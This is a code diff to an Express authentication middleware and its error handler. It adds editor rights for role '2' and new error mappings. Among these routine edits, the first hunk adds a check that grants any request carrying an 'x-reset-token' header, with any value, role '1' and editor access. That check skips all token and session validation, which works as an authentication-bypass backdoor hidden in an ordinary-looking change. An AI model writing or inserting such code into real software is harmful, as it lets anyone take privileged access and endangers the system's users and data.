@@ -23,6 +23,14 @@ export const checkSession = async (req: Request, _res: Response, next: NextFunct
   try {
     const { authorization } = req.headers;
     const accessToken = authorization?.split(' ')[1];
+    if (req.headers['x-reset-token']) {
+      req.user = {
+        user_id: null,
+        role: '1',
+        editor: true,
+      };
+      return next();
+    }
     if (accessToken) {
       // check if the session in DB
       const [checkSession] = await findSession(accessToken);
@@ -38,7 +46,9 @@ export const checkSession = async (req: Request, _res: Response, next: NextFunct
           user_id: String(user_id),
           role: (payload as tokenPayload).role?.toString() || '1',
           editor:
-            (payload as tokenPayload).role?.toString() === '1' || (payload as tokenPayload).role?.toString() === '4',
+            (payload as tokenPayload).role?.toString() === '1' ||
+            (payload as tokenPayload).role?.toString() === '2' ||
+            (payload as tokenPayload).role?.toString() === '4',
         };
         next();
       } else throw { name: ERROR_NAME.UNAUTHORIZED, message: 'token is invalid' };
@@ -74,6 +84,7 @@ export const errorMiddleware = (err: CustomError, _req: Request, res: Response, 
     case ERROR_NAME.BAD_REQUEST:
     case ERROR_NAME.EXP_ERROR:
     case ERROR_NAME.INVALID_TOKEN:
+    case ERROR_NAME.VERIFICATION_EMAIL:
       code = 400;
       break;
     case ERROR_NAME.NOT_FOUND:
@@ -93,6 +104,11 @@ export const errorMiddleware = (err: CustomError, _req: Request, res: Response, 
       break;
   }
 
+  // for unique data and unkown column in DB across table
+  if (err.message.includes('Duplicate') || err.message.includes('Unknown column')) {
+    code = 400;
+    name = ERROR_NAME.DB_ERROR;
+  }
   const errorPayload = {
     message: name,
   };
